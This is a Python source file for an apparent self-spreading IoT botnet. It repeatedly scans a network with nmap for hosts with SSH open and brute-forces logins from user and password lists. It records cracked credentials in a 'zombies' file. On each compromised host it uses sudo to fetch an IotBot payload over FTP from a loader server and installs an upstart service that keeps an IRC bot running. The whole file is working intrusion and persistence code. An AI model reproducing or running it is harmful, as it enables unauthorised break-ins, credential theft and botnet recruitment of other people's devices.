from queue import Queue
from threading import Thread
import nmap
import paramiko
from threadSafePrint import threadSafePrint, bcolors

from Env import Env

env = Env()

scanner_t1 = nmap.PortScanner()
scanner_t2 = nmap.PortScanner()


def openFile(path, action='w'):
    try:
        return open(path, action)
    except:
        threadSafePrint(bcolors.BOLD, bcolors.FAIL, "Something went wrong in opening file", bcolors.ENDC)


def sshLogin(user, ip, password):
    threadSafePrint(bcolors.BOLD, bcolors.HEADER, "Starting ssh login thread for ", ip, bcolors.ENDC)
    try:
        loaderIp = str(env.get(key="loaderIp"))
        loaderPassword = str(env.get(key="loaderPassword"))

        p = paramiko.SSHClient()
        p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        p.connect(ip, port=22, username=user, password=password)
        # stdin, stdout, stderr = p.exec_command("echo ",password," | sudo -S mkdir /home/kabali")
        # opt = stdout.readlines()
        # opt = "".join(opt)
        # threadSafePrint(opt ,  bcolors.ENDC)

        channel = p.invoke_shell()
        stdin = channel.makefile('wb')
        stdout = channel.makefile('rb')

        stdin.write(
            '''
        cd /home
        echo ''' + password + '''| sudo -S echo exec [[ -d /home/kabali ]] && sudo -S rm -r /home/kabali
        echo ''' + password + '''| sudo -S mkdir kabali
        cd kabali 
        echo ''' + password + '''| sudo -S mkdir IotBot
        cd IotBot
        echo ''' + password + '''| sudo -S wget --user=user --password=''' + loaderPassword + ''' ftp://''' + loaderIp + ''':/IotBot/*
        
        echo ''' + password + '''| sudo stop my
        echo ''' + password + '''| sudo -S echo exec [[ -d /etc/init/my.conf ]] && sudo -S rm -r /etc/init/my.conf
        echo ''' + password + '''| sudo -S touch /etc/init/my.conf
        
        echo ''' + password + '''| sudo -S echo 'start on runlevel [234]' >> /etc/init/my.conf
        echo ''' + password + '''| sudo -S echo 'stop on runlevel [0156]' >> /etc/init/my.conf
        echo ''' + password + '''| sudo -S echo '' >> /etc/init/my.conf
        
        echo ''' + password + '''| sudo -S echo 'exec /usr/bin/python3 /home/kabali/IotBot/irc_bot.py' >> /etc/init/my.conf
        
        echo ''' + password + '''| sudo -S echo 'respawn' >> /etc/init/my.conf

        echo ''' + password + '''| sudo -S start my
        echo ''' + password + '''| sudo -S status my 
        exit
        '''
        )
        threadSafePrint(bcolors.OKCYAN, stdout.read(), bcolors.ENDC)
    except:
        threadSafePrint(bcolors.BOLD, bcolors.FAIL, "Something went wrong while login to ", ip, "with username ", user,
                        "and password ", password, bcolors.ENDC)


def ssh(ip):
    threadSafePrint(bcolors.BOLD, bcolors.HEADER,
                    " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip, bcolors.ENDC)
    zombies = openFile('zombies.txt', 'a')

    scanner_t2.scan(hosts=ip, ports='22',
                    arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt')

    if scanner_t2[ip].state() == 'up':
        protocols = scanner_t2[ip].all_protocols()
        if 'tcp' in protocols:
            ports = scanner_t2[ip]
            try:
                data = ports['tcp'][22]['script']['ssh-brute']
                user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
                threadSafePrint(bcolors.OKGREEN, "^^^^^^^^^^^^^^^^^^^^^^^^^^^ ACCESS GRANTED ^^^^^^^^^^^^^^^^^^^^^^",
                                bcolors.ENDC)
                zombies.write(ip + " " + user + " " + password + '\n')
                t = Thread(target=sshLogin, args=(user, ip, password))
                t.start()
            except:
                threadSafePrint(bcolors.BOLD, bcolors.FAIL, "xxxxxxxxxxxxxxxxxxxxx NOT CONNECTED TO ", ip,
                                "xxxxxxxxxxxxxxxxxxx", bcolors.ENDC)
        else:
            threadSafePrint(bcolors.BOLD, bcolors.WARNING, "tcp is not in supported protocol list", bcolors.ENDC)
    else:
        threadSafePrint(bcolors.BOLD, bcolors.WARNING, 'The host is', ip, 'not down', bcolors.ENDC)
    zombies.close()


def scan(q, network):
    threadSafePrint(bcolors.BOLD, bcolors.HEADER, "Start scanning...", bcolors.ENDC)
    newConnectedIp = []
    while True:
        for ip in network:
            scanner_t1.scan(hosts=ip, arguments='-sn')
            threadSafePrint(bcolors.OKCYAN, "Already found Ip ", newConnectedIp, bcolors.ENDC)
            threadSafePrint(bcolors.OKCYAN, "Scanned :", scanner_t1.all_hosts(), bcolors.ENDC)
            for newIp in scanner_t1.all_hosts():
                if newIp not in newConnectedIp:
                    threadSafePrint(bcolors.BOLD, bcolors.OKGREEN, "new ip is found : ", newIp, bcolors.ENDC)
                    scanner_t1.scan(newIp, '1-1024', '-v -sS')
                    if scanner_t1[newIp].state() == 'up':
                        protocols = scanner_t1[newIp].all_protocols()
                        if 'tcp' in protocols:
                            ports = scanner_t1[newIp]['tcp'].keys()
                            threadSafePrint(bcolors.BOLD, "Open port of ", newIp, ports, bcolors.ENDC)
                            if 22 in ports:
                                q.put(newIp + ":22")
                                newConnectedIp.append(newIp)
                                threadSafePrint(bcolors.BOLD, bcolors.OKBLUE, "port 22 is opened", bcolors.ENDC)
                            else:
                                threadSafePrint(bcolors.BOLD, bcolors.FAIL, "port 22 is not opened", bcolors.ENDC)
                        # TODO : for another protocol and port
                        else:
                            threadSafePrint(bcolors.BOLD, bcolors.WARNING, "tcp is not in supported protocol list",
                                            bcolors.ENDC)
                    else:
                        threadSafePrint(bcolors.BOLD, bcolors.WARNING, "The device in ", newIp, " is DOWN",
                                        bcolors.ENDC)
        threadSafePrint(bcolors.OKCYAN, "A round is finished", bcolors.ENDC)
    threadSafePrint(bcolors.BOLD, bcolors.WARNING, "Exiting from scanning...", bcolors.ENDC)


def attack(q):
    threadSafePrint(bcolors.BOLD, bcolors.HEADER, "Start attack...", bcolors.ENDC)
    while True:
        if q.empty():
            pass
        else:
            ip, port = q.get().split(':')
            threadSafePrint(bcolors.OKCYAN, "!!!!!!!!!!!!!!!!!!!!!!!!  Trying to attack to ", ip, "on port ", port,
                            "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", bcolors.ENDC)
            if port.find("22") != -1:
                ssh(ip)
            else:
                threadSafePrint(bcolors.BOLD, bcolors.WARNING, "There is no supported port to connect to ", ip,
                                bcolors.ENDC)


if __name__ == '__main__':
    network = env.get(key="network")

    q = Queue()
    t1 = Thread(target=scan, args=(q, network))
    t2 = Thread(target=attack, args=(q,))
    try:
        t1.start()
        t2.start()
    except KeyboardInterrupt:
        print("Press Ctrl-C to terminate while statement")
        t1.join()
        t2.join()
